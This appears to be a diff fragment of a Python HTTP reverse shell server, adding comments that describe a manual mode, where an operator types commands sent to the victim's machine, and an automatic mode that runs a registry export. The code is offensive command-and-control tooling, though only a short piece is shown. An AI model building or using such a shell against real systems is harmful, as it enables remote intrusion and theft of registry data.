@@ -14,6 +14,7 @@ Date: November 1, 2019
 HTTP Reverse Shell Server
 """
 
+# if user provides command line param manual true
 if len(sys.argv) == 2:
     MANUAL = True
 else:
@@ -33,7 +34,12 @@ class ReverseShellHandler(http.server.BaseHTTPRequestHandler):
         When the server is hit with a GET request 
         it requires input from the attacker that will 
         be sent back to the victims machine
+
+        If manual, allow input from user
+        If not manual, run registry export
+
         """
+
         if MANUAL:
             command = input(Fore.YELLOW + ">> ")
             print(Style.RESET_ALL)
